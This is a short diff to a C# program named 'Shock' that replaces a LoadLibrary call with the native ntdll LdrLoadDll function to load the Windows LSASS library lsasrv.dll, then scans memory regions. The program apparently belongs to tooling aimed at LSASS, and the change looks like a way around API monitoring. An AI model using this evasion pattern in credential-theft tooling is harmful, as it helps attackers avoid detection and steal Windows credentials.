@@ -5,9 +5,12 @@ namespace Shock
 {
     internal class Program
     {
-        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr LoadLibrary(string lpFileName);
+        //[DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr LoadLibrary(string lpFileName);
         [DllImport("ntdll.dll")] public static extern uint NtQueryVirtualMemory(IntPtr hProcess, IntPtr lpAddress, uint MemoryInformationClass, out MEMORY_BASIC_INFORMATION MemoryInformation, uint MemoryInformationLength, out uint ReturnLength);
+        [DllImport("ntdll.dll", SetLastError = true)] private static extern int LdrLoadDll(IntPtr PathToFile, IntPtr Flags, ref UNICODE_STRING ModuleFileName, out IntPtr ModuleHandle);
+
         [StructLayout(LayoutKind.Sequential)] public struct MEMORY_BASIC_INFORMATION { public IntPtr BaseAddress; public IntPtr AllocationBase; public int AllocationProtect; public IntPtr RegionSize; public int State; public int Protect; public int Type; }
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)] public struct UNICODE_STRING { public ushort Length; public ushort MaximumLength; public IntPtr Buffer; }
 
 
         public static string ToJson(string[] array)
@@ -42,7 +45,26 @@ namespace Shock
         static void Main(string[] args)
         {
             // Get library address
-            IntPtr lsasrv_addr = LoadLibrary("lsasrv.dll");
+            string dllPath = @"C:\Windows\System32\lsasrv.dll";
+            UNICODE_STRING unicodeString = new UNICODE_STRING
+            {
+                Length = (ushort)(dllPath.Length * 2),
+                MaximumLength = (ushort)((dllPath.Length + 1) * 2),
+                Buffer = Marshal.StringToHGlobalUni(dllPath)
+            };
+
+            IntPtr lsasrv_addr;            
+            try
+            {
+                int result = LdrLoadDll(IntPtr.Zero, IntPtr.Zero, ref unicodeString, out lsasrv_addr);
+                if (result != 0){
+                    Console.WriteLine("[-] Failed to load DLL. NTSTATUS: " + result.ToString("X"));
+                }
+            }
+            finally
+            {
+                Marshal.FreeHGlobal(unicodeString.Buffer);
+            }
 
             // Get library size
             long proc_max_address_l = (long)0x7FFFFFFEFFFF;
